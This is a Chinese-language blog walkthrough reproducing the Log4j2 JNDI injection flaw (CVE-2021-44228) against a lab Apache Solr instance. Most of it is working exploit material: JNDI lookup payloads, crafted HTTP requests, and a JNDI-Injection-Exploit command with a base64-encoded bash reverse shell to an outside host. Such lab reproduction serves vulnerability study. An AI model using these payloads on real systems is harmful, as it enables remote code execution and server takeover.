# Apache Log4j2 lookup JNDI 注入漏洞（CVE-2021-44228） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16275591.html`](https://www.cnblogs.com/NoCirc1e/p/16275591.html)

Apache Log4j 2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于`${jndi:ldap://evil.com/example}`的 lookup 用于进行 JNDI 注入，执行任意代码。

参考链接：

*   [`logging.apache.org/log4j/2.x/security.html`](https://logging.apache.org/log4j/2.x/security.html)
*   [`www.lunasec.io/docs/blog/log4j-zero-day/`](https://www.lunasec.io/docs/blog/log4j-zero-day/)
*   [`xz.aliyun.com/t/10649`](https://xz.aliyun.com/t/10649)

## 漏洞环境

Apache Log4j2 不是一个特定的 Web 服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如 Apache Solr。

执行如下命令启动一个 Apache Solr 8.11.0，其依赖了 Log4j 2.14.1：

```
docker-compose up -d
```

![](img/9003b43abc8d9f54a246eac0afe40477.png)

服务启动后，访问`http://your-ip:8983`即可查看到 Apache Solr 的后台页面。

![](img/97c8d8d74ab13e2265672addb967a166.png)

## 漏洞复现

`${jndi:dns://${sys:java.version}.example.com}`是利用 JNDI 发送 DNS 请求的 Payload，我们将其作为管理员接口的 action 参数值发送如下数据包：

```
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com} HTTP/1.1
Host: your-ip:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close 
```

实际利用 JNDI 注入漏洞，可以使用[这个工具](https://github.com/welk1n/JNDI-Injection-Exploit)

使用方法

1.  `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc1LjE1MC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.75.150`
2.  `-C 参数接的是执行的命令`
3.  `-A 是 VPS-ip`

这个工具会同时监听 http、ldap 与 rmi，并生成 payload

![](img/4f390f2573beff687dba206d51cda62e.png)

反弹 Shell 成功（提前开启监听）

```
GET /solr/admin/cores?action=${jndi:rmi://192.168.75.150:1099/nz9ar3} HTTP/1.1
Host: 192.168.75.130:8983
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Connection: close 
```

![](img/668cc55ac8a579ff2446bba6310d743b.png)